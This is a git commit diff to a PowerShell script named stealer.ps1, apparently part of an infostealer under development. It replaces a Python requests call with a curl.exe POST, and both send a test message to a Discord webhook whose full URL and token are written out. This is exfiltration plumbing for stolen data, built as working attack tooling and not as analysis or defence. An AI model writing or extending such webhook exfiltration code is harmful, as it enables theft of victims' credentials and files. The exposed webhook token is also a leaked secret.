ba86aaa7bdeb0a521af1a4bf6da39cfd6d1222e5
Ily3s <116631559+sddyes@users.noreply.github.com>
2026-02-01 22:06:29 +0100

    Update stealer.ps1

--- stealer.ps1
+++ stealer.ps1
@@ -1,5 +1,1 @@
-cd $env:TEMP\py
-
-.\python.exe -m pip install requests --quiet
-
-.\python.exe -c "import requests; requests.post('https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W', json={'content':'TEST'})"
+curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"TEST DIRECT`"}" https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W
